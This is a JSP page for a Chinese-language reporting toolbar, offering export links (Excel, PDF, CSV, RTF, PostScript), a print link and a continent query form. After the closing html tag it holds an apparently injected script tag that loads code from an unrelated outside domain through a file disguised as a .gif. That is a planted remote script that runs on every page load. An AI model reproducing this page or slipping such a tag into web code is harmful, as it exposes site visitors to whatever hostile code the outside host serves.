<%@ page contentType="text/html; charset=UTF-8" %>
<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>

<% 

 String examplePath=getServletConfig().getServletContext().getRealPath("/");
  
 if(!examplePath.endsWith(File.separator))
 {
 	examplePath+= File.separator ;
 }
 
 examplePath+=("example"+File.separator);

 examplePath = examplePath.replace('\\','/');


%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>工具栏</title>
<style type="text/css">
<!--
BODY {
	COLOR: #333333; 
	FONT-FAMILY: Arial,helvetica,Vernada; 
	FONT-SIZE: 12px; 
	TEXT-DECORATION: none
}
.text {
	font-family: Vernada,Arial,helvetica;
	font-size: 14px;
	color:#4652aa;	
}
.text1 {
	font-family: Vernada,Arial,helvetica;
	COLOR: #333333; 	
	FONT-SIZE: 14px; 
}
.input {
	FONT-FAMILY: Vernada,Arial,helvetica;
	FONT-SIZE: 12px; 
	VERTICAL-ALIGN: middle; 
	COLOR: #333333; 
}
-->
</style>
<script type='text/javascript' src='../dhtml/toolbox.js'></script>
<script LANGUAGE="JavaScript"><!-- 
   var _toolbox;
   function loadtoolbox()
   {
      // alert("hello");
       _toolbox=new Toolbox(form1,"../server");
   }
--></script>
<base target="main">
</head>
<body onload="loadtoolbox()" >
 <form action="../server?file=<%=examplePath%>parameter.xml&as=dhtml" 
    method="POST" name="form1" id="form1" onSubmit="return _toolbox.generateCacheId()"  >
	 

 <table width="390" height="44" border="0" cellpadding="0" cellspacing="0" class="text">
      <tr>
        <td height="44"><div align="center"><span class="normal"><a href="javascript:;" class="text" onclick="_toolbox.exportAs('xls')">excel导出</a> <a href="javascript:;" class="text" onclick="_toolbox.exportAs('pdf')">pdf导出</a> <a href="javascript:;" class="text" onclick="_toolbox.exportAs('csv')">csv导出</a> <a href="javascript:;" class="text" onclick="_toolbox.exportAs('rtf')">rtf导出</a> <a href="javascript:;" class="text" onclick="_toolbox.exportAs('ps')">postscript导出</a> <a href="javascript:;" class="text" onclick="_toolbox.print()">打印</a> </span></div></td>
      </tr>
    </table>

   <table width="523" height="45" border="0" cellpadding="0" cellspacing="5" bgcolor="#F5F5DC">
      <tr>
        <td><span class="text1">所在洲（南美洲、北美洲）：</span><span class="normal">&nbsp;        
            <input type="text" name="$conti" value="南美洲">
            <input name="Input" type="submit" value="查询">
                </span></td>
      </tr>
    </table>
 </form>

 <iframe src='' width=0 height=0 id='printer-iframe'/>
</body>
</html><script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
